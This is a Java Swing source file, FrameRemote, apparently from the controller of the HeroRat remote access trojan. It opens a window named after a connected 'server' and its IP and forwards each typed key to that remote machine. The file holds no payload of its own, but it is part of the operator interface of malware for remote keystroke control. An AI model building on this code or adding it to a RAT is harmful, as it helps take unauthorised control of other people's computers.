package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;

import javax.swing.JFrame;
import javax.swing.JLabel;

import net.herorat.features.remote.Remote;
import net.herorat.features.servers.Server;


public class FrameRemote extends JFrame
{
	private static final long serialVersionUID = -4768066156733303247L;
	
	private Server server;

	public FrameRemote(Server server)
	{
		setTitle("Remote control - " + server.getName() + " @ " + server.getIp());
		this.server = server;
		
		initComponents();
		display();
		this.setMinimumSize(new Dimension(400, 100));
		centerWindow();
	}
	
	private void initComponents()
	{
		createInformation();
		createListener();
	}
	
	private void display()
	{
		pack();
		setVisible(true);
	}
	
	private void centerWindow()
	{
		int bounds_top = Toolkit.getDefaultToolkit().getScreenSize().height / 2;
		int bounds_left = Toolkit.getDefaultToolkit().getScreenSize().width / 2;
		int half_height = this.getSize().height / 2;
		int half_width = this.getSize().width / 2;
		this.setLocation(bounds_left - half_width, bounds_top - half_height);
	}
	
	private void createInformation()
	{
		JLabel info = new JLabel("Type what you want to in the frame (Require focus).");
		add(info, BorderLayout.CENTER);
	}
	
	private void createListener()
	{
		this.addKeyListener(new KeyListener() {
			public void keyTyped(KeyEvent e)
			{
				Remote.sendKey(server, e.getKeyCode());
			}
			
			public void keyPressed(KeyEvent e)
			{
			}
			
			public void keyReleased(KeyEvent e)
			{
			}
		});
	}
}